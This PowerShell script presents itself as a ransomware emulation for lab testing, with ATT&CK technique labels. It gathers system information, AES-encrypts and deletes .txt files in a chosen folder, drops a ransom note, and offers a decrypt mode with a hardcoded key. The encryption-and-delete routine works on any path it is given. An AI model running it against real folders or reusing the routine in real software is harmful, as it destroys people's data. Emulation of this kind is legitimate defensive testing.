<#
DISCLAIMER:
This script is for EDUCATIONAL and SECURITY TESTING purposes ONLY.
Run it exclusively in a virtual machine or isolated lab environment.
It will create dummy files, encrypt them, and allow decryption.
DO NOT run on production systems or with real data.
#>

param(
    [string]$TargetPath = "$env:TEMP\RansomSimTest",
    [ValidateSet("Encrypt","Decrypt")][string]$Mode = "Encrypt",
    [string]$RecoveryKey = "SuperSecretRansomKey123!"   # Change this if you want a different key
)

# AES Encrypt/Decrypt function (AES-256-CBC with random IV per file)
function Invoke-AESEncryption {
    param(
        [ValidateSet("Encrypt","Decrypt")][string]$Mode,
        [string]$Key,
        [string]$Path
    )

    $sha = New-Object System.Security.Cryptography.SHA256Managed
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($Key))
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    if ($Mode -eq "Encrypt") {
        $aes.GenerateIV()                                   # Random IV per file
        $bytes = [IO.File]::ReadAllBytes($Path)
        $encryptor = $aes.CreateEncryptor()
        $encrypted = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
        $full = $aes.IV + $encrypted                        # Prepend IV
        [IO.File]::WriteAllBytes($Path + ".ransom", $full)
        Remove-Item $Path -Force
    }
    else {  # Decrypt
        $bytes = [IO.File]::ReadAllBytes($Path)
        $aes.IV = $bytes[0..15]                             # Extract IV
        $cipher = $bytes[16..($bytes.Length-1)]
        $decryptor = $aes.CreateDecryptor()
        $decrypted = $decryptor.TransformFinalBlock($cipher, 0, $cipher.Length)
        $outPath = $Path -replace '\.ransom$',''
        [IO.File]::WriteAllBytes($outPath, $decrypted)
        Remove-Item $Path -Force
    }

    $aes.Dispose()
    $sha.Dispose()
}

# Create test directory
if (-not (Test-Path $TargetPath)) { New-Item -Path $TargetPath -ItemType Directory | Out-Null }

if ($Mode -eq "Encrypt") {
    Write-Host "=== MITRE ATT&CK Emulation Starting ===" -ForegroundColor Yellow

    # T1059.001 - PowerShell execution (already running)
    Write-Host "[T1059.001] Executing via PowerShell"

    # T1082 - System Information Discovery
    Write-Host "[T1082] Collecting system information..."
    Get-ComputerInfo | Out-File "$TargetPath\discovery.txt"

    # Create dummy files
    Write-Host "Creating 20 dummy files..."
    1..20 | ForEach-Object {
        "This is dummy file $_ - important document for ransomware simulation." | 
            Out-File "$TargetPath\dummy$_.txt"
    }

    # T1486 - Data Encrypted for Impact
    Write-Host "[T1486] Simulating ransomware encryption..."
    Get-ChildItem $TargetPath -Filter *.txt | ForEach-Object {
        Invoke-AESEncryption -Mode Encrypt -Key $RecoveryKey -Path $_.FullName
        Write-Host "  Encrypted: $($_.Name)"
    }

    # Drop ransom note
    @"
Your files have been encrypted by a simulated ransomware attack!

All files in $TargetPath are now encrypted.
To decrypt them, run this script again with:
    .\RansomSim.ps1 -Mode Decrypt -RecoveryKey $RecoveryKey

(For real attacks you would never get the key this easily.)
"@ | Out-File "$TargetPath\README_RANSOM.txt"

    Write-Host "`nSimulation complete!" -ForegroundColor Green
    Write-Host "Encrypted files are in: $TargetPath"
    Write-Host "Recovery key (for decryption): $RecoveryKey"
}
else {  # Decrypt mode
    Write-Host "Decrypting files..." -ForegroundColor Cyan
    Get-ChildItem $TargetPath -Filter *.ransom | ForEach-Object {
        Invoke-AESEncryption -Mode Decrypt -Key $RecoveryKey -Path $_.FullName
        Write-Host "  Decrypted: $($_.Name)"
    }
    Write-Host "Decryption complete!" -ForegroundColor Green
}
